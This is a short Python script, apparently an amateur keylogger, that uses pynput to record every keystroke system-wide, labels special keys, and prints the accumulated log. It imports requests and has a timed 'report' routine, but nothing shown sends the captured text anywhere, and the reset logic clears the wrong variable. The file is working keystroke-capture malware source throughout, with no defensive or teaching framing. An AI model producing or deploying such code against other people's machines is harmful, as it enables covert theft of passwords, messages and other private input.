import pynput.keyboard
import threading
import requests

keys = " " #mail

class Keylogger:
    def __init__(self):
        self.keys = " "
    
    def log(self, string):
        self.keys = self.keys + string #key_changes > " "key_changes > " "space
        print(self.keys)
    
    def keypress(self, key): #space
        global keys #local + global
        try:
            key_changes = str(key.char) #123445 -> string 
        except AttributeError:
            if key == key.space:
                key_changes = " space "
            elif key == key.enter:
                key_changes = " enter "
            elif key == key.esc:
                key_changes = " esc "
                #print(keys)
            else:
                key_changes = " " + str(key) + " " 
        self.log(key_changes)
    
    def report(self): #listener
        global keys
        keys = " "
        timing = threading.Timer(5, self.report)
        timing.start()
    
    def start(self):
        listen = pynput.keyboard.Listener(on_press=self.keypress) #space
        with listen as listens:
            self.report()
            listens.join()

p = Keylogger()
p.start()
